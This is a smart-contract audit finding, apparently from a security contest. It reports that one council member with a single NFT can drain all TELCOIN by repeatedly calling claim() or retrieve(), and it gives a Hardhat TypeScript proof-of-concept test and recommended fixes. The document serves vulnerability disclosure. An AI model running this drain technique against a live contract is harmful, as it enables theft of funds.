# Council member can claim all Balance of contract


## Summary
A single council member can steal the entire amount of TELCOIN by essentially calling claim() or retrieve(), even though it is protected by OnlyAuthorized. This modifier only checks if the user has an NFT or the GOVERNANCE_COUNCIL_ROLE.

## Vulnerability Detail
A single council member, possessing one NFT, can exploit the claim() function to drain all TELCOIN. The Proof of Concept below illustrates how this can be achieved, pinpointing the specific issue. 

Add it in CouncilMember.test.ts and run it using 
```shell
npx hardhat test --grep "draining the contract should not fail"
```

```typescript
       describe("draining the contract should not fail", () => {
            it("a single user can claim all Telcoin calling claim ", async () => {
                await expect(councilMember.mint(member.address));

                for (let i = 0; i < 100; i++) {
                    await expect(councilMember.connect(member).claim(0, 100)).to.not.reverted;
                }
                
                
                console.log( await telcoin.balanceOf(member));
            });
        
            it("a single user can claim all Telcoin calling claim", async () => {
                await expect(councilMember.mint(member.address));
                for (let i = 0; i < 100; i++) {
                    await expect(councilMember.connect(member).retrieve()).to.not.reverted;
                    // Your loop logic here
                }
               
                await expect(councilMember.connect(member).claim(0, await councilMember.balances(0))).to.not.reverted;
                
                console.log( await telcoin.balanceOf(member));
            });
        });
 ```
In this PoC, we mint 1 NFT for a regular member. In the first test, we demonstrate the member's ability to abuse the claim() function by calling it 100 times.This number can be increased as desired. In the second part, the same process is replicated with the user calling retrieve(). 
This vulnerability arises because the retrieve() function updates the user's balance repeatedly without any limitation.


## Impact
A single council member with ownership of one NFT can exploit the contract, which can lead to the theft of all TELCOIN.

## Tool used

Manual Review

## Recommendation
To address this issue, I recommend the team to implement the following two actions from my perspective:

1)Remove the _retrieve() from the claiming function to prevent the increment of the user's balance upon each call.

2)Safeguard the retrieve() function by allowing only GOVERNANCE_COUNCIL_ROLE to call it when necessary for updating all balances.

The test uses the exact PoC mentioned above. If the recommended changes are implemented correctly, the test will fail.
